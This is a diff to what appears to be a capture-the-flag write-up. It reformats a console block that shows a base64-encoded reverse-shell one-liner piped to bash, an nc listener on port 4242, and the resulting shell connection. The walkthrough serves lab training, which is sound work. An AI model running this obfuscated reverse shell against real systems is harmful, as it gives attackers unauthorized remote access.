@@ -91,7 +91,10 @@ Password: earthclimatechangebad4humans
 After giving the ‘ls’ command and checking, I saw that there was an executor of the command. Let’s get shell
 
 ```console
-echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA3LzQyNDIgMD4mMQ== | base64 -d | bash'Don't forget to change.'└─$ nc -nvlp 4242             
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA3LzQyNDIgMD4mMQ== | base64 -d | bash'
+
+                                                                          Don't forget to change.
+└─$ nc -nvlp 4242             
 listening on [any] 4242 ...
 connect to [192.168.0.107] from (UNKNOWN) [192.168.0.105] 50364
 bash: cannot set terminal process group (846): Inappropriate ioctl for device
